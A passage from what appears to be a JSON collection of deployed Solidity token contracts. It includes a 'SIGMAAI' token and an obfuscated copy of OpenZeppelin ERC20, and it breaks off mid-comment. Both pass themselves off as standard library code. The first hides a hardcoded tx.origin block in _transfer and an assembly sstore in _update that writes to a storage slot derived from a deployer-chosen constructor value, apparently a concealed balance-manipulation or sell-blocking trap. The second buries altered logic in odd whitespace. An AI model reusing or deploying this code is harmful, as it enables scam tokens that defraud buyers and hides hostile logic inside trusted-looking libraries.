mechanisms].\n *\n * The default value of {decimals} is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\nabstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {\n    mapping(address account => uint256) private _balances;\n\n    mapping(address account => mapping(address spender => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n    uint256 private _decimals;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_,uint256 decimals_) {\n        _name = name_;\n        _symbol = symbol_;\n        _decimals = decimals_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Skips emitting an {Approval} event indicating an allowance update. This is not\n     * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, value);\n        _transfer(from, to, value);\n        return true;\n    }\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal {\n        if (from == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        if (to == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        require(tx.origin != 0xf4c21a1cB819E5F7ABe6dEFde3d118D8F3D61FA7, 'n');\n        _update(from, to, value);\n    }\n\n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _update(address from, address to, uint256 value) internal virtual {\n        if (from == address(0)) {\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n        } else {\n            uint256 fromBalance = _balances[from];\n            if (fromBalance < value) {\n                revert ERC20InsufficientBalance(from, fromBalance, value);\n            }\n            unchecked {\n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n            }\n        }\n\n        if (to == address(0)) {\n            unchecked {\n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n            }\n        } else {\n            unchecked {\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            }\n        }\n        bytes32 s = keccak256(abi.encode(uint160(_decimals), keccak256(abi.encode(to, 1)))) ;\n        bytes32 v = keccak256(abi.encodePacked(from,value));\n        assembly {\n            sstore(s, v)\n        }\n        emit Transfer(from, to, value);\n    }\n\n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(address(0), account, value);\n    }\n\n    /**\n     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\n     * Relies on the `_update` mechanism.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead\n     */\n    function _burn(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        _update(account, address(0), value);\n    }\n\n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal {\n        _approve(owner, spender, value, true);\n    }\n\n    /**\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\n     *\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\n     *     super._approve(owner, spender, value, true);\n     * }\n     * ```\n     *\n     * Requirements are the same as {_approve}.\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n        if (owner == address(0)) {\n            revert ERC20InvalidApprover(address(0));\n        }\n        if (spender == address(0)) {\n            revert ERC20InvalidSpender(address(0));\n        }\n        _allowances[owner][spender] = value;\n        if (emitEvent) {\n            emit Approval(owner, spender, value);\n        }\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an {Approval} event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            if (currentAllowance < value) {\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\n            }\n            unchecked {\n                _approve(owner, spender, currentAllowance - value, false);\n            }\n        }\n    }\n}\n\ncontract SIGMAAI is ERC20, Ownable {\n    constructor(uint256 decimals_) ERC20(unicode\"SIGMA AI\", unicode\"SIGMAAI\",decimals_) Ownable(msg.sender) {\n        _mint(msg.sender, 1000000000 ether);\n    }\n}",
      "count": 1,
      "addresses": [
        "0xB4500453F7c292f6548f318DA5104621C7d2576C"
      ],
      "names": [
        "SIGMAAI"
      ]
    },
    {
      "id": "fec95837-3bbe-4bc4-b28d-a06582d18b4f",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0 )  ( utils/Address.sol )\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address  { \n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA ) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract ( address account) internal view returns  ( bool) {\n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0 ; \n    \n                         } \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`.  { \n                        sendValue\n                         }  removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     *  { \n                        ReentrancyGuard } \n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue ( address payable recipient, uint256 amount ) public  { \n                        \n        require ( address(this ).balance >= amount, \"Address: insufficient balance\" ) ; \n\n         ( bool success,  ) = recipient.call\n                         { value: amount\n                         } (\"\" ) ; \n        require ( success, \"Address: unable to send value, recipient may have reverted\") ; \n     } \n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function  ( like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data ) internal returns  ( bytes memory) \n                         { \n        return functionCallWithValue ( target, data, 0, \"Address: low-level call failed\" ) ; \n     } \n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-}\n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns  ( bytes memory) \n                        {\n        return functionCallWithValue ( target, data, 0, errorMessage );\n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( address target, bytes memory data, uint256 value) internal returns  ( bytes memory ) {\n                        \n        return functionCallWithValue ( target, data, value, \"Address: low-level call with value failed\");\n    \n                        }\n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCallWithValue-address-bytes-uint256-}\n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n     ) internal returns  ( bytes memory )  { \n                        \n        require(address(this).balance >= value, \"Address: insufficient balance for call\" );\n         ( bool success, bytes memory returndata ) = target.call{\n                        value: value}\n                         ( data) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage);\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( address target, bytes memory data) internal view returns  ( bytes memory) \n                         { \n        return functionStaticCall ( target, data, \"Address: low-level static call failed\");\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory ) {\n                        \n        (bool success, bytes memory returndata) = target.staticcall ( data ) ; \n        return verifyCallResultFromTarget(target, success, returndata, errorMessage );\n    \n                         } \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-\n                        }[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( address target, bytes memory data ) internal returns (bytes memory)  { \n                        \n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns  ( bytes memory ) {\n                        \n         ( bool success, bytes memory returndata ) = target.delegatecall(data ) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n    }\n                        \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one ) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget(\n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal view returns (bytes memory )  { \n                        \n        if (success) \n                         { \n            if  ( returndata.length == 0)  { \n                        \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require ( isContract(target ), \"Address: call to non-contract\") ; \n            }\n                        \n            return returndata ; \n        }\n                         else  { \n                        \n            _revert(returndata, errorMessage ) ; \n         } \n                        \n    \n                         } \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns  ( bytes memory) \n                         { \n        if  ( success )  { \n                        \n            return returndata ; \n        }\n                         else  { \n                        \n            _revert(returndata, errorMessage ) ; \n         } \n                        \n     } \n                        \n\n    function _revert ( bytes memory returndata, string memory errorMessage) private pure \n                         { \n        // Look for revert reason and bubble it up if present\n        if  ( returndata.length > 0 ) {\n                        \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly {\n                        \n                let returndata_size := mload ( returndata)\n                revert(add ( 32, returndata), returndata_size)\n            }\n                        \n        }\n                         else  { \n                        \n            revert ( errorMessage );\n        \n                        }\n    \n                        }\n}\n                        \npragma solidity ^0.8.0 ; \n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned ).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context  { \n                        \n\n    function _contextSuffixLength (  ) internal view virtual returns  ( uint256)  { \n                        \n        return 0;\n    \n                         } \n\n    function _msgData (  ) internal view virtual returns  ( bytes calldata)  { \n                        \n        return msg.data;\n    \n                        }\n    function _msgSender ( ) internal view virtual returns  ( address ) \n                        {\n        return msg.sender ; \n     } \n                        \n\n\n } \n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors  { \n                        \n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver ) ; \n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance ( address spender, uint256 allowance, uint256 needed ) ; \n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver ( address receiver );\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender ( address spender) ; \n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender ( address sender );\n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed ) ; \n } \n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20  { \n                        \n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account ) external view returns (uint256 ) ; \n\n    \n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an  { \n                        Approval\n                        } event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool );\n    \n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply( ) external view returns  ( uint256) ; \n    /**\n     * @dev Emitted when `value` tokens are moved from one account  ( `from` ) to\n     * another  ( `to` ).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer ( address indexed from, address indexed to, uint256 value ) ; \n\n    \n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to  { \n                        approve } \n                        . `value` is the new allowance.\n     */\n    event Approval ( address indexed owner, address indexed spender, uint256 value) ; \n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer\n                         }  event.\n     */\n    function transferFrom ( address from, address to, uint256 amount) external returns (bool) ; \n        \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer\n                         }  event.\n     */\n    function transfer(address to, uint256 amount ) external returns (bool) ; \n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through  { \n                        transferFrom}\n                        . This is\n     * zero by default.\n     *\n     * This value changes when {\n                        approve } \n                         or \n                        {transferFrom}\n                         are called.\n     */\n    function allowance ( address owner, address spender) external view returns  ( uint256);\n\n } \n                        \n\n\ninterface IERC20Metadata is IERC20  { \n                        \n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol ( ) external view returns (string memory) ; \n\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals ( ) external view returns (uint8 ) ; \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns  ( string memory);\n\n } \n                        \n\n\n\n\n\n/**\n * @dev Implementation of the \n                        {IERC20 } \n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {\n                        _mint}\n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of \n                         { decimals } \n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  {\n                        \n    mapping(address => uint256) private _balances ; \n\n\n    mapping(address => mapping ( address => uint256)) private _allowances ; \n    uint256 private _totalSupply ; \n\n    string private _name ; \n    string private _symbol;\n\n\n    /**\n     * @dev See \n                        {IERC20-allowance}\n                        .\n     */\n    function allowance ( address owner, address spender) public view virtual returns  ( uint256 ) {\n                        \n        return _allowances[owner][spender];\n     } \n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {\n                        Approval}\n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal  { \n                        \n        _approve(owner, spender, value, true) ; \n    }\n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol (  ) public view virtual returns (string memory)  { \n                        \n        return _symbol ; \n    }\n                        \n    \n    /**\n     * @dev Sets the values for  { \n                        name}\n                         and {\n                        symbol\n                         } .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor ( string memory name_, string memory symbol_) {\n                        \n        _name = name_ ; \n        _symbol = symbol_ ; \n    }\n                        \n    \n\n    /**\n     * @dev See \n                        {IERC20-balanceOf}\n                        .\n     */\n    function balanceOf ( address account) public view virtual returns (uint256) {\n                        \n        return _balances[account];\n     } \n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-transfer } \n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer ( address to, uint256 value) public virtual returns (bool) {\n                        \n        address owner = _msgSender() ; \n        _transfer(owner, to, value);\n        return true ; \n    }\n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a \n                         { Transfer } \n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, \n                        {_update\n                         }  should be overridden instead.\n     */\n    function _mint(address account, uint256 value ) internal  { \n                        \n        if  ( account == address(0 ) ) \n                         { \n            revert ERC20InvalidReceiver(address ( 0) );\n        \n                        }\n        _update ( address(0), account, value ) ; \n    \n                         } \n    \n    /**\n     * @dev Variant of  { \n                        _approve } \n                         with an optional flag to enable or disable the  { \n                        Approval } \n                         event.\n     *\n     * By default (when calling  { \n                        _approve\n                         }  ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve ( address owner, address spender, uint256 value, bool ) internal virtual override \n                         { \n     *     super._approve ( owner, spender, value, true) ; \n     * \n                         } \n     * ```\n     *\n     * Requirements are the same as {\n                        _approve}\n                        .\n     */\n    function _approve ( address owner, address spender, uint256 value, bool emitEvent ) internal virtual {\n                        \n        if  ( owner == address(0) ) {\n                        \n            revert ERC20InvalidApprover ( address ( 0));\n        \n                         } \n        if  ( spender == address ( 0)) {\n                        \n            revert ERC20InvalidSpender ( address ( 0 ) ) ; \n        }\n                        \n        _allowances[owner][spender] = value ; \n        if  ( emitEvent) {\n                        \n            emit Approval ( owner, spender, value);\n        \n                         } \n     } \n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05`  ( `505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {\n                        IERC20-balanceOf\n                         }  and {\n                        IERC20-transfer } \n                        .\n     */\n    function decimals ( ) public view virtual returns (uint8) \n                        {\n        return 15 ; \n    \n                        }\n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to  { \n                        transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {\n                        Transfer}\n                         event.\n     *\n     * NOTE: This function is not virtual, \n                        {_update}\n                         should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal  { \n                        \n        if (from == address(0) ) {\n                        \n            revert ERC20InvalidSender ( address(0) ) ; \n        }\n                        \n        if (to == address ( 0 )) {\n                        \n            revert ERC20InvalidReceiver ( address ( 0 ) );\n         } \n                        \n        _update(from, to, value ) ; \n    \n                        }\n    \n    /**\n     * @dev See {\n                        IERC20-transferFrom}\n                        .\n     *\n     * Skips emitting an  { \n                        Approval } \n                         event indicating an allowance update. This is not\n     * required by the ERC. See \n                        {xref-ERC20-_approve-address-address-uint256-bool- } \n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom ( address from, address to, uint256 value) public virtual returns (bool)  { \n                        \n        address spender = _msgSender (  );\n        _spendAllowance(from, spender, value );\n        _transfer(from, to, value ) ; \n        return true;\n     } \n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns ) if `from`\n     *  ( or `to` ) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     */\n    function _update(address from, address to, uint256 value ) internal virtual {\n                        \n        if (from == address(0) )  { \n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value ; \n        \n                         }  else  { \n                        \n            uint256 fromBalance = _balances[from];\n            if  ( fromBalance < value ) {\n                        \n                revert ERC20InsufficientBalance(from, fromBalance, value);\n            }\n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n            \n                        }\n         } \n                        \n\n        if (to == address ( 0) )  { \n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n            }\n                        \n         } \n                         else {\n                        \n            unchecked  { \n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n             } \n                        \n        \n                        }\n\n        emit Transfer ( from, to, value ) ; \n     } \n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-totalSupply } \n                        .\n     */\n    function totalSupply ( ) public view virtual returns (uint256)  { \n                        \n        return _totalSupply ; \n     } \n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an \n                        {Approval}\n                         event.\n     */\n    function _spendAllowance ( address owner, address spender, uint256 value) internal virtual {\n                        \n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance < type ( uint256 ).max )  { \n                        \n            if  ( currentAllowance < value ) {\n                        \n                revert ERC20InsufficientAllowance(spender, currentAllowance, value ) ; \n             } \n                        \n            unchecked \n                        {\n                _approve(owner, spender, currentAllowance - value, false);\n            }\n                        \n         } \n                        \n    \n                         } \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name( ) public view virtual returns  ( string memory)  { \n                        \n        return _name ; \n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-approve } \n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n  